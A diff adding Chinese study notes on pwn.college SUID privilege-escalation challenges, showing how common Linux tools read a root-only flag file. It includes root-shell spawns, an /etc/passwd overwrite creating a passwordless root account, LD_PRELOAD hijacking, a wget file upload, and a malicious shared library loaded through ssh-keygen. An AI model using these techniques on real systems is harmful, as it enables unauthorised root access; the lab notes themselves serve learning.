@@ -942,55 +942,570 @@ fetch("http://google.com")
 
 
 
+## Program Misuse
+
+> ​	本模块主要讨论linux命令的提权,简简单来说就是通过漏洞读取到或者能执行原来只有root用户能执行的程序.
+>
+
+​	假设有一个被设置了 SUID 的程序 `/usr/bin/less`（用于分页显示文件内容），你平时用它查看自己的文件没问题。但如果这个程序拥有 root 权限运行，并且你能通过它打开任意文件——那你就可能通过它**读取系统中只有 root 才能访问的文件（比如 `/root/flag.txt`）**。这就是提权.总之就是用一些读文件的提权程序来获取想要的东西.
+
+### 读取
+
+vim保存到可读的文件内部:
+
+```vim
+:w /tmp/myflag.txt
+```
+
+一下让我用emacs我用不明白,我靠.
+
+od命令以8进制形式读取:
+
+```sh
+bash-5.2$ /challenge/od /flag 
+0000000 073560 027156 067543 066154 063545 075545 030511 053150
+0000020 030115 043471 047145 054511 032521 042066 043545 033525
+0000040 034161 061122 051516 027172 047144 047124 073570 046571
+0000060 063462 046552 042571 053572 005175
+0000072
+bash-5.2$ /challenge/od -c /flag 
+0000000   p   w   n   .   c   o   l   l   e   g   e   {   I   1   h   V
+0000020   M   0   9   G   e   N   I   Y   Q   5   6   D   e   G   U   7
+0000040   q   8   R   b   N   S   z   .   d   N   T   N   x   w   y   M
+0000060   2   g   j   M   y   E   z   W   }  \n
+0000072
+```
+
+hd,应该是16进制:hexdump工具:
+
+```sh
+bash-5.2$ /challenge/hd /flag
+00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 30 52 76 48  |pwn.college{0RvH|
+00000010  68 6f 4c 71 78 49 2d 56  36 73 72 65 43 68 39 75  |hoLqxI-V6sreCh9u|
+00000020  49 61 69 57 69 36 54 2e  64 52 54 4e 78 77 79 4d  |IaiWi6T.dRTNxwyM|
+00000030  32 67 6a 4d 79 45 7a 57  7d 0a                    |2gjMyEzW}.|
+0000003a
+```
+
+先可以先编码再解码:
+
+```sh
+bash-5.2$ /challenge/base32 /flag | base32 -d
+pwn.college{ozIbUKD4FugLiKOYb3nxZsqWyNW.dZTNxwyM2gjMyEzW}
+```
+
+split拆分文件:
+
+```sh
+split -l 1000 bigfile.txt part_
+```
+
+这会生成文件：`part_aa`, `part_ab`, `part_ac`... 依次命名。
+
+`-l 行数` ：按行数拆分，比如每 1000 行一个文件。
+
+`-b 字节数` ：按大小拆分，比如每 10M 一个文件：`split -b 10M bigfile`。
+
+`-d` ：用数字作为后缀（如 part_00, part_01），而不是字母。
+
+### 压缩,打包,归档工具
+
+压缩程序也是同理:
+
+zip and unzip	tar	bzip	gzip
+
+直接输出到终端.
+
+```sh
+$ bzip2 -dc /flag.bz2
+```
+
+`tar` 是 Linux/Unix 系统中常用的打包和解包工具，通常用于 `.tar`、`.tar.gz`、`.tar.bz2` 等格式的归档文件。
+
+tar的命令参数比较多,可以直接查:
+
+```sh
+tar -czf archive.tar.gz 文件或目录
+```
+
+`ar` 是 Unix/Linux 下用来创建、修改、提取 **静态库文件**（比如 `.a` 文件）和简单归档文件的工具。它常用于**生成静态链接库**。
+
+> ​	学过linker部分就知道.
+
+```sh
+ar rcs libfoo.a file1.o file2.o
+```
+
+- `r`：插入（replace）文件到归档
+- `c`：创建新的归档（不显示提示）
+- `s`：创建索引，便于快速查找
+
+这个命令会将 `file1.o` 和 `file2.o` 打包成静态库 `libfoo.a`。
+
+查看内容:
+
+```
+ar t libfoo.a
+```
+
+提取文件:
+
+```
+ar x libfoo.a file1.o
+```
+
+删除这个归档中的文件:
+
+```
+ar d libfoo.a file1.o
+```
 
 
 
+`cpio` 是一个强大的打包工具，用于将文件归档、解包或复制。它不像 `tar` 那样常用，但在某些系统工具中（如 Linux 内核 `initramfs`）仍然很重要。
+
+```sh
+find . -type f | cpio -o > archive.cpio
+```
+
+```sh
+bash-5.2$ echo /flag | /challenge/cpio -o > ./c.cpio
+1 block
+bash-5.2$ ls
+Desktop  asm  c.cpio  encoding  leap  public_html  testdir  web_talking
+bash-5.2$ ls -l c.cpio 
+-rw-r--r-- 1 hacker hacker 512 Jul 25 04:24 c.cpio
+bash-5.2$ cat c.cpio 
+�q�r��h�:/flagpwn.college{AZZyiu3WItcJ3QZo2zQBhHj1arx.dRjNxwyM2gjMyEzW}
+�q
+  TRAILER!!!
+```
+
+> ​	打包之后的文件是有权限的,直接读取,不要再解包了,这样就没有意义了,因为不能读取的权限还是不能更改.
+>
+
+`genisoimage` 是一个用来创建 ISO 9660 文件系统镜像的工具，常用于把文件或目录打包成 ISO 镜像文件，通常用于刻录光盘（CD/DVD）或虚拟光驱挂载。
+
+generate iso image.
+
+```sh
+genisoimage -o myarchive.iso -R -J /tmp/iso_root
+```
+
+结果用正常的手段处理失败,没有read的权限就无法对于/flag进行打包的操作,用符号链接欺骗也没有作用:
+
+```sh
+bash-5.2$ genisoimage -sort "/flag"
+genisoimage: Incorrect sort file format
+        pwn.college{QjXhZmAQvY4fqUhC9UrYNM9XMuB.dVjNxwyM2gjMyEzW}
+```
+
+`genisoimage` 解析 `/flag` 这个文件作为排序文件，期待它是一个**文本格式的排序文件列表**.
+
+`/flag` 实际上是存放**flag内容的文件**，里面内容格式肯定不符合排序文件格式要求.
+
+当 `genisoimage` 尝试读取和解析这个文件失败时，程序报错，把文件的内容直接输出了.
+
+> 触发错误,结果程序打印了真实的文件内容.
+>
+
+### 常见的可执行命令
+
+`env` 命令主要是用来显示当前 shell 环境中的所有环境变量及其值。
+
+```sh
+bash-5.2$ /challenge/env cat /flag 
+pwn.college{8eNtwIFs0HK5qCufCyqwir46M1Q.dZjNxwyM2gjMyEzW}
+```
+
+**find** + exec执行:
+
+```sh
+/challenge/find / -exec cat /flag \; 2>/dev/null
+```
 
 
 
+2>/dev/null是忽略错误信息.
 
+|        方法         |   适用场景   |                       示例                       |
+| :-----------------: | :----------: | :----------------------------------------------: |
+| `find / -name flag` | 查找 `/flag` |         `find / -name flag 2>/dev/null`          |
+|  `-exec cat /flag`  | SUID `find`  |      `/challenge/find / -exec cat /flag \;`      |
+|   `-exec /bin/sh`   |  SUID 提权   |     `/challenge/find / -exec /bin/sh -p \;`      |
+|   `-fprint` 泄露    |   绕过过滤   | `/challenge/find / -name flag -fprint /tmp/leak` |
+|    `LD_PRELOAD`     |    劫持库    |   `LD_PRELOAD=/tmp/evil.so /challenge/find /`    |
 
+如果用**make**呢?把你要执行的shell写道Makefile里面去,接着make run.
 
+```sh
+bash-5.2$ echo 'run: ; cat /flag' > Makefile
+bash-5.2$ make run
+```
 
+**nice** -n 19 ...	用来调整进程的优先级,所以可以直接执行.
 
+**timeout** 10 cat /flag	用来限制程序运行的时间
 
+**stdbuf**	用来修改标准I/O的缓冲行为
 
+```sh
+/challenge/stdbuf -i0 cat /flag 
+```
 
+这就是禁用了缓冲行为.
 
+**setarch**	修改体系结构,环境内存
 
+比如关闭ASLR栈随机化:
 
+```sh
+setarch -R /challenge/binary  # -R 禁用ASLR
+```
 
+**watch**	定期监控文件的变化:
 
+```sh
+watch -n 1 "ls -l /flag"  # 每秒检查/flag权限/内容变化
+watch -n 0.1 "tail -c 10 /tmp/secret_buffer"  # 监控临时文件泄露
+watch -x cat /flag
+```
 
+### socat网络工具
 
+```sh
+socat -u "file:/flag" -
+```
 
+做单向文件读取的操作.
 
+### 脚本对话框 whiptail
 
+```sh
+whiptail --textbox /flag 20 80
+```
 
+对话框形式显示文件内容.
 
+### 流式文本编辑器
 
+awk	sed	ed
 
+awk
 
+```sh
+/challenge/awk '{print}' /flag 
+awk 'BEGIN {system("cat /flag")}'
+awk 'BEGIN {for (k in ENVIRON) print k"="ENVIRON[k]}'
+awk 'BEGIN {while (("find / -name flag 2>/dev/null" | getline r) > 0) print r}'
+```
 
+sed
 
+```sh
+sed '' /flag
+sed -n p /flag  # 必须显式使用p命令才会输出
+```
 
+ed
 
+ed命令 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工 作模式。ed命令支持多个内置命令，常见内置命令如下：
 
+> ​	这个ed又难使用,又老.
 
+1. A # 切换到输入模式，在文件的最后一行之后输入新的内容；
 
+2. C # 切换到输入模式，用输入的内容替换掉最后一行的内容；
 
+3. i # 切换到输入模式，在当前行之前加入一个新的空行来输入内容；
 
+4. d # 用于删除最后一行文本内容；
 
+5. n # 用于显示最后一行的行号和内容；
 
+6. w # <文件名>：一给定的文件名保存当前正在编辑的文件；
 
+7. q # 退出ed编辑器。
 
+   ```sh
+   ed /flag <<< $',p\nq'
+   ```
 
+### 修改文件归属者和权限问题
 
+​	**chown**命令 改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。
 
+​	**chmod**命令 可以通过符号组合的方式更改目标文件或目录的权限。 通过八进制数的方式更改目标文件或目录的权限。 通过参考文件的权限来更改目标文件或目录的权限。
 
+```sh
+chown -c hacker /flag
+changed ownership of '/flag' from root to hacker
 
+chmod 777 /flag
+```
 
+### 文件移动 cp mv
 
+cp怎么用?直接拿到输出流:
+
+```sh
+/challenge/cp /flag /dev/stdout 
+pwn.college{gZXo02LhQhpar93h4H-YZMRMe8d.dFDOxwyM2gjMyEzW}
+```
+
+怎么用mv来解决?
+
+> ​	直接用mv创建无密码的root用户,比较有意思.
+
+```sh
+echo "root::0:0::/:/bin/sh" > /tmp/fake_passwd  # 创建无密码 root 账户
+/challenge/mv /tmp/fake_passwd /etc/passwd      # 尝试覆盖
+su root                                        # 测试是否能提权
+```
+
+### 脚本解释器
+
+perl脚本语言,清空环境变量并且执行命令,防止不安全报警.
+
+反引号执行命令.
+
+```sh
+env -i /challenge/perl -e 'system("/bin/sh -p")'
+```
+
+py就更简单了.
+
+ruby,代码直接写入一个临时的文件.
+
+```sh
+bash-5.2$ echo 'puts File.read("/flag")' > /tmp/read_flag.rb
+/challenge/ruby /tmp/read_flag.rb
+pwn.college{wtsWZe6UuaZ5gCu5nxDKd1pz1GP.dVDOxwyM2gjMyEzW}
+```
+
+bash -p 直接获取一个root shell
+
+### 绕过
+
+> ​	这里的基本逻辑就是,报错信息会有文件内部内容的反馈,而我们要利用的就是文件内部的这些信息.
+
+**date**,暴露文件内容
+
+```sh
+/challenge/date -f /flag 
+/challenge/date: invalid date ‘pwn.college{sQjICzidh1N3Htx7xYbfPsEWPCO.ddDOxwyM2gjMyEzW}’
+```
+
+**dmesg**:查看内核环形缓冲区（kernel ring buffer）日志的工具，通常用于调试系统启动和硬件问题.
+
+dmesg -F直接就可以查看
+
+用wc处理:
+
+```sh
+/challenge/wc --files0-from=flag 
+/challenge/wc: 'pwn.college{MuqITaDu2AevhnD94BiPxQ2xwuV.dlDOxwyM2gjMyEzW}'$'\n': No such file or directory
+```
+
+gcc:用头文件报错的形式泄露flag.
+
+```sh
+bash-5.2$ echo '#include "/flag"' > /tmp/include_flag.c
+/challenge/gcc /tmp/include_flag.c -o /tmp/fake 2>&1 | grep -A 20 -B 20 "error"
+In file included from /tmp/include_flag.c:1:
+/flag:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘.’ token
+    1 | pwn.college{81dDFDZ-J0vHZ6jnOjG4NWrPp6A.dBTOxwyM2gjMyEzW}
+      |    ^
+/flag:1:13: error: invalid suffix "dDFDZ" on integer constant
+    1 | pwn.college{81dDFDZ-J0vHZ6jnOjG4NWrPp6A.dBTOxwyM2gjMyEzW}
+      |             ^~~~~~~
+```
+
+总之,我们有很多方法来让他报错:
+
+|         方法         |                 命令示例                 |           泄露方式            |
+| :------------------: | :--------------------------------------: | :---------------------------: |
+| **直接编译 `/flag`** | `/challenge/gcc /flag -o /tmp/fake 2>&1` | 报错信息可能包含 `/flag` 内容 |
+| **`#include` 包含**  | `echo '#include "/flag"' > /tmp/test.c`  |      预处理错误泄露内容       |
+|   **`-E` 预处理**    |        `/challenge/gcc -E /flag`         |      展开宏或头文件内容       |
+| **`-x c` 强制解析**  | `/challenge/gcc -x c /flag -o /tmp/fake` |       语法错误泄露内容        |
+|    **`ld` 链接**     |   `/challenge/gcc -Wl,--verbose /flag`   |      链接器报错泄露内容       |
+| **`objdump` 反汇编** | `/challenge/gcc -c /flag && objdump -D`  | 反汇编输出可能泄露二进制内容  |
+|  **`strings` 过滤**  |  `/challenge/gcc /flag 2>&1 | strings`   |       提取可打印字符串        |
+|  **`strace` 跟踪**   |      `strace /challenge/gcc /flag`       |     观察 `read` 系统调用      |
+
+as:
+
+```sh
+bash-5.2$ echo '.include "/flag"' > exploit.S
+bash-5.2$ /challenge/as exploit.S -o exploit.o 2>&1
+/flag: Assembler messages:
+/flag:1: Error: no such instruction: `pwn.college{8tUrSUsUtv-4Do9fqp7IAz7tUhW.dFTOxwyM2gjMyEzW}'
+```
+
+wget
+
+netcat对于8888端口进行监听,wget进行上传.
+
+```sh
+bash-5.2$ nc -lp 8888 & /challenge/wget --post-file=/flag http://127.0.0.1:8888
+[1] 2927
+--2025-07-25 11:45:27--  http://127.0.0.1:8888/
+Connecting to 127.0.0.1:8888... connected.
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 127.0.0.1:8888
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+pwn.college{UpNj4nAE9FehErapEL5pVsnxReJ.dJTOxwyM2gjMyEzW}
+```
+
+ssh-keygen,**一般程序suid提权思路**
+
+> ​	比较难的部分.参考了https://www.freebuf.com/articles/database/321219.html,这篇博客,https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s,这是答案的讲解视频.
+
+`ssh-keygen` 是一个用于生成、管理和转换 SSH 密钥的工具,主要用于身份验证.
+
+我们写C程序:
+
+```C
+#include<stdio.h>
+#include<stdlib.h>
+#include <unistd.h>      
+#include <fcntl.h>      
+#include <sys/sendfile.h>
+static void inject() __attribute__((constructor));
+void C_GetFunctionList(){
+sendfile(1,open("/flag",0),0,4096);
+char *argvv[]={"bash","-p",NULL};
+execvp("/bin/bash",argvv);
+}
+```
+
+**构造函数声明**
+
+```C
+static void inject() __attribute__((constructor));
+```
+
+**作用**：
+
+- `__attribute__((constructor))` 是 GCC 特性，标记 `inject()` 为 **共享库加载时自动执行的函数**。
+- 无需手动调用，库被加载时会立即运行。
+
+**伪造的 PKCS#11 函数**
+
+```C
+void C_GetFunctionList() {
+    // 空函数体
+}
+```
+
+**用途**：
+
+- `ssh-keygen -D` 要求加载的库实现 PKCS#11 标准接口（如 `C_GetFunctionList`）。
+- 即使不实现具体逻辑，也需声明该函数以通过校验。
+
+**恶意代码（`inject` 函数）**
+
+```C
+static void inject() {
+    // 读取并输出 /flag
+    sendfile(1, open("/flag", 0), 0, 4096);
+
+    // 启动 root shell
+    char *argvv[] = {"bash", "-p", NULL};
+    execvp("/bin/bash", argvv);
+}
+```
+
+**逐行解析**：
+
+1. **`sendfile(1, open("/flag", 0), 0, 4096)`**
+
+   - `open("/flag", 0)`：以只读模式打开 `/flag` 文件，返回文件描述符（fd）。
+   - `sendfile(1, fd, 0, 4096)`：将 `fd` 的内容发送到标准输出（`1`），最多读取 4096 字节。
+   - **效果**：直接打印 `/flag` 的内容。
+
+2. **`execvp("/bin/bash", ["bash", "-p", NULL])`**
+
+   - `execvp` 替换当前进程为 `/bin/bash`，保留 SUID 权限（`-p` 参数）。
+
+   - 
+
+     对比 `system("bash -p")`
+
+     ：
+
+     - `system()` 会启动子进程，丢失 SUID 权限；
+     - `execvp` 直接继承当前进程的权限（更可靠）。
+
+**编译命令**
+
+```sh
+gcc -shared -fPIC -o su.os exploit.c
+```
+
+- `-shared`：生成共享库（`.so` 或 `.os`）。
+- `-fPIC`：生成位置无关代码（必需）。
+- 下面直接加载执行.
+
+```sh
+ssh-keygen -D ./su.os
+```
+
+> ​	两个关键点.
+
+### **1. 为什么需要动态加载？**
+
+#### **(1) 绕过静态编译限制**
+
+- **静态编译**的程序会将所有代码和库打包到单个二进制文件中，无法在运行时插入外部代码。
+- **动态加载**允许程序在运行时加载外部共享库（如 `.so` 或 `.os`），从而注入恶意逻辑。
+
+#### **(2) 利用 SUID 权限继承**
+
+- `ssh-keygen` 是 SUID root 程序，运行时具有 root 权限。
+- 通过 `-D` 动态加载共享库时，库中的代码会继承 `ssh-keygen` 的 **root 权限**，从而实现提权。
+
+#### **(3) 灵活性**
+
+- 动态库可以独立编译和替换，无需重新编译主程序（如 `ssh-keygen`）。
+- 适合快速测试和迭代攻击代码（如修改 `sendfile` 或 `execvp` 的逻辑）。
+
+------
+
+### **2. 为什么需要位置无关代码（PIC）？**
+
+#### **(1) 共享库的内存地址不确定**
+
+- 动态库会被加载到进程内存的 **任意地址**（由操作系统动态分配）。
+- 如果代码不是位置无关的，它可能无法正确访问全局变量或函数（因为硬编码的地址会失效）。
+
+#### **(2) PIC 的工作原理**
+
+- PIC 代码通过 **全局偏移表（GOT, Global Offset Table）** 和 **过程链接表（PLT, Procedure Linkage Table）** 动态解析地址。
+- 所有跳转和变量访问都基于相对偏移量，而非绝对地址。
+
+#### **(3) 编译时的 `-fPIC` 选项**
+
+```
+gcc -shared -fPIC -o su.os exploit.c
+```
+
+- `-fPIC` 告诉编译器生成位置无关代码，确保共享库能在任何内存地址运行。
+
+> ​	提权的问题到这里就告一段落.
+
+## SQL Playground
+
+> ​	关于SQL,我们也接触的时间比较长,主要使用MySQL,现在可以来看看这个有意思的话题.
+
+s
 
 
 
